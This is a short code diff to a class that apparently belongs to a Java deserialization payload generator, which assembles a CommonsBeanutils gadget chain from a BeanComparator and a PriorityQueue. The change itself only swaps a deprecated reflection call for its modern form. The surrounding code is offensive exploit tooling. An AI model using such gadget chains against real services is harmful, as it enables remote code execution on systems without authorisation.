@@ -28,7 +28,7 @@ public class cb160 implements ObjectPayload<Object> {
 
     public static Object getCbSink_1(CtClass ctClass, Object template) throws Exception {
         Class<?> beanCompareClazz = ctClass.toClass();
-        BeanComparator comparator = (BeanComparator) beanCompareClazz.newInstance();
+        BeanComparator comparator = (BeanComparator) beanCompareClazz.getDeclaredConstructor().newInstance();
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         queue.add("1");
         queue.add("1");
